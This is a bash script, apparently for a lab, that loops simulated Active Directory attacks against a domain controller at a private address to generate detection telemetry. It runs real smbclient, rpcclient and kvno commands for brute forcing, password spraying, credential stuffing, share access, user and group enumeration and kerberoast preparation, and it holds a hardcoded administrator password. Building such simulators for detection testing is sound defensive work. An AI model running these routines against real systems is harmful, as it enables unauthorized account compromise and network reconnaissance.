#!/data/data/com.termux/files/usr/bin/bash

# ============================================================
# ThreatWeaver — Enhanced AD Attack Simulation (Termux)
# Admin-only version
# ============================================================

DC="192.168.40.10"
DOMAIN="PROJECT"

# --- Accounts ---
ADMIN_USER="Administrator"
ADMIN_PASS="Admin123#"
WRONG_PASS="WrongPassword123"

# --- Fake usernames for enumeration/spraying ---
FAKE_USERS=("admin" "backup_svc" "sqlservice" "helpdesk" "john.doe" "svc_account" "krbtgt" "guest")
SPRAY_PASSWORDS=("Spring2024!" "Password1" "Welcome123" "Company1!" "Qwerty123")

CYCLE=1

# ============================================================
# ATTACK FUNCTIONS
# ============================================================

simulate_brute_force() {
    echo "[*] Brute Force — rapid failed logins for admin..."
    for i in {1..12}; do
        smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$WRONG_PASS" >/dev/null 2>&1
        sleep 0.3
    done
}

simulate_password_spray() {
    echo "[*] Password Spraying..."
    local spray_pass="${SPRAY_PASSWORDS[$((RANDOM % ${#SPRAY_PASSWORDS[@]}))]}"
    for user in "${FAKE_USERS[@]}"; do
        smbclient -L //$DC -U "$DOMAIN/$user%$spray_pass" >/dev/null 2>&1
        sleep 0.5
    done
}

simulate_credential_stuffing() {
    echo "[*] Credential Stuffing..."
    for i in {0..4}; do
        local user="${FAKE_USERS[$i]}"
        local pass="${SPRAY_PASSWORDS[$i]}"
        smbclient -L //$DC -U "$DOMAIN/$user%$pass" >/dev/null 2>&1
        sleep 0.4
    done
}

simulate_success_after_fail() {
    echo "[*] Success After Failure..."
    for i in {1..5}; do
        smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$WRONG_PASS" >/dev/null 2>&1
    done
    sleep 1
    smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" >/dev/null 2>&1
}

simulate_privileged_logon() {
    echo "[*] Privileged Admin Logon..."
    smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" >/dev/null 2>&1
}

simulate_lateral_movement() {
    echo "[*] Lateral Movement — SMB shares..."
    local shares=("IPC\$" "ADMIN\$" "C\$" "NETLOGON" "SYSVOL")
    for share in "${shares[@]}"; do
        smbclient //$DC/$share -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" -c "dir" >/dev/null 2>&1
        sleep 0.5
    done
}

simulate_smb_recon() {
    echo "[*] SMB Reconnaissance..."
    smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" >/dev/null 2>&1
    smbclient -L //$DC -N >/dev/null 2>&1
    smbclient -L //$DC -U "%" >/dev/null 2>&1

    if command -v rpcclient &>/dev/null; then
        rpcclient -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" $DC -c "enumdomusers" >/dev/null 2>&1
        rpcclient -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" $DC -c "enumdomgroups" >/dev/null 2>&1
    fi
}

simulate_account_enumeration() {
    echo "[*] Account Enumeration..."
    local probe_users=("administrator" "admin" "guest" "krbtgt" "backup"
                       "svc_sql" "svc_web" "helpdesk" "user1"
                       "domain_admin" "exchange_svc" "print_svc" "ftp_user")

    for user in "${probe_users[@]}"; do
        smbclient -L //$DC -U "$DOMAIN/$user%probe" >/dev/null 2>&1
        sleep 0.2
    done
}

simulate_kerberoast_prep() {
    echo "[*] Kerberoasting Preparation..."
    local service_accounts=("sqlservice" "httpd_svc" "exchange_svc" "backup_svc" "iis_svc")

    for svc in "${service_accounts[@]}"; do
        smbclient -L //$DC -U "$DOMAIN/$svc%$WRONG_PASS" >/dev/null 2>&1
        sleep 0.3
    done

    if command -v kvno &>/dev/null; then
        kvno "cifs/$DC" >/dev/null 2>&1
    fi
}

simulate_offhours_access() {
    local current_hour=$(date +%H)
    echo "[*] Off-hours access simulation — hour: $current_hour"

    for i in {1..4}; do
        smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" >/dev/null 2>&1
        sleep 0.5
    done
}

simulate_distributed_brute() {
    echo "[*] Distributed brute force simulation..."
    for user in "${FAKE_USERS[@]}"; do
        for i in {1..3}; do
            smbclient -L //$DC -U "$DOMAIN/$user%$WRONG_PASS" >/dev/null 2>&1
        done
        sleep 0.2
    done
}

# ============================================================
# MAIN LOOP
# ============================================================

echo "=============================================="
echo " ThreatWeaver Attack Simulator (Admin Only)"
echo " Target DC: $DC | Domain: $DOMAIN"
echo "=============================================="
echo ""

while true; do

    echo "=============================="
    echo " CYCLE $CYCLE — $(date '+%Y-%m-%d %H:%M:%S')"
    echo "=============================="

    simulate_brute_force
    sleep 2

    simulate_password_spray
    sleep 2

    simulate_credential_stuffing
    sleep 2

    simulate_success_after_fail
    sleep 2

    simulate_privileged_logon
    sleep 2

    simulate_lateral_movement
    sleep 2

    simulate_smb_recon
    sleep 2

    simulate_account_enumeration
    sleep 2

    simulate_kerberoast_prep
    sleep 2

    simulate_offhours_access
    sleep 2

    simulate_distributed_brute

    echo ""
    echo "[+] Cycle $CYCLE complete."
    echo "[+] Waiting 30 seconds..."
    echo ""

    CYCLE=$((CYCLE + 1))
    sleep 30

done
